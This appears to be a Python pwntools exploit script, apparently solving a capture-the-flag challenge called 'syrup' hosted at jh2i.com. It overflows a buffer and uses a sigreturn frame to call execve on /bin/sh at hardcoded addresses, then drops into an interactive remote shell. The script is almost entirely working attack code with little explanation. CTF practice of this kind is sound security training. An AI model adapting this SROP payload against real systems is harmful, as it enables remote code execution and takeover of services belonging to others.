from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'syrup'
elf = ELF(program,checksec=False)
lokal = False
context.arch = 'amd64'

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    #libc = elf.libc
else:
    host = 'jh2i.com'
    port = '50036'
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = "b *0x401078 \n c"
    gdb.attach(xp,cmd)

#Exploit Here
syscall = 0x000000000040100f
binsh = 0x40103a

p = ""
p = p.ljust(1024,"\x90")
p += p64(24642)
p += p64(0xf)

p += p64(0x401000) #ada pop rax

frame1 = SigreturnFrame()
frame1.rax = constants.SYS_execve
frame1.rdi = binsh
frame1.rsi = 0
frame1.rdx = 0
frame1.rip = syscall

p += str(frame1)

s(p)

xp.interactive()
